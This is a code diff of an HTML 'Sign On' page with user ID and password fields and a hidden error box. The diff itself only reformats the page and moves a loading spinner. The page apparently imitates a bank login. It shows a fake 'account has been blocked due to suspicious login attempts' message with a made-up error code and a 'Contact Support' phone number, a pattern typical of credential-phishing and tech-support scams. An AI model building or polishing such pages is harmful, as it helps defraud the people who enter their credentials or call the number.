@@ -44,31 +44,27 @@
                 <h3>Sign On</h3>
                 <!-- Error message placeholder -->
                 <div class="error-message" id="error-message" style="display: none;">
-              <p>Error Code : 0X0X0027384 <br> Your account has been blocked due to some suspicious login attempts. <br>Contact Support : <a href="18664097152">+1-866-409-7152</a>
+                    Error Code : 0X0X0027384 <br> Your account has been blocked due to some suspicious login attempts. <br>Contact Support : <a href="18664097152">+1-866-409-7152</a>
+                </div>
+                <!-- Spinner placeholder -->
+                <div class="spinner" id="spinner" style="display: none;">
+                    <img src="spinner.gif" alt="Loading...">
                 </div>
                 <form id="login-form">
-    <label for="user-id">User ID</label>
-    <input type="text" id="user-id" placeholder="User ID">
-    <label for="password">Password</label>
-    <input type="password" id="password" placeholder="Password">
-    <div class="remember-me">
-        <input type="checkbox" id="remember-user-id">
-        <label for="remember-user-id">Remember User ID</label>
-    </div>
-    
-    <!-- Flex container for button and spinner -->
-    <div class="button-container">
-        <button type="button" onclick="validateForm()">Sign On</button>
-        <div class="spinner" id="spinner" style="display: none;">
-            <img src="spinner.gif" alt="Loading...">
-        </div>
-    </div>
-
-    <div class="additional-links">
-        <a href="#">Register / Activate</a>
-        <a href="#">Forgot User ID or Password</a>
-    </div>
-    <a href="#" class="passwordless-sign-on">Passwordless Sign On</a>
+                    <label for="user-id">User ID</label>
+                    <input type="text" id="user-id" placeholder="User ID">
+                    <label for="password">Password</label>
+                    <input type="password" id="password" placeholder="Password">
+                    <div class="remember-me">
+                        <input type="checkbox" id="remember-user-id">
+                        <label for="remember-user-id">Remember User ID</label>
+                    </div>
+                    <button type="button" onclick="validateForm()">Sign On</button>
+                    <div class="additional-links">
+                        <a href="#">Register / Activate</a>
+                        <a href="#">Forgot User ID or Password</a>
+                    </div>
+                    <a href="#" class="passwordless-sign-on">Passwordless Sign On</a>
                 </form>
             </div>
         </div>
